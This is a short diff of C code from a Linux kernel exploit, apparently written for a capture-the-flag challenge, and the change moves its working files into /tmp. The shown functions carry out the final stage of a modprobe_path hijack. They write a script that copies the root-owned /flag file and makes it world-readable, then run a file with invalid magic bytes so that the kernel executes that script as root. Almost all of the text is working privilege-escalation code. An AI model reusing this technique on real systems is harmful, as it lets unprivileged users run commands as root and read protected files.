@@ -98,20 +98,20 @@ void environ_set(void){
     puts("[*] Returned to userland, setting up for fake modprobe");
     
     //system("mkdir /tmp");
-    system("echo '#!/bin/sh\ncp /flag /home/hacker/kernel_exploitation/flag\nchmod 777 /home/hacker/kernel_exploitation/flag' > /home/hacker/kernel_exploitation/exp");
-    system("chmod +x /home/hacker/kernel_exploitation/exp");
+    system("echo '#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/exp");
+    system("chmod +x /tmp/exp");
 
-    system("printf '\xff\xff\xff\xff'  > /home/hacker/kernel_exploitation/dummy");
-    system("chmod +x /home/hacker/kernel_exploitation/dummy");
+    system("printf '\xff\xff\xff\xff'  > /tmp/dummy");
+    system("chmod 777 /tmp/dummy");
     //exit(0);
 }
 void get_flag(void){
     puts("[*] Run unknown file");
     system("cat /proc/sys/kernel/modprobe");
-    system("/home/hacker/kernel_exploitation/dummy");
+    system("/tmp/dummy");
 
     puts("[*] Hopefully flag is readable");
-    system("cat /home/hacker/kernel_exploitation/flag");
+    system("cat /tmp/flag");
     exit(0);
 }
 ```
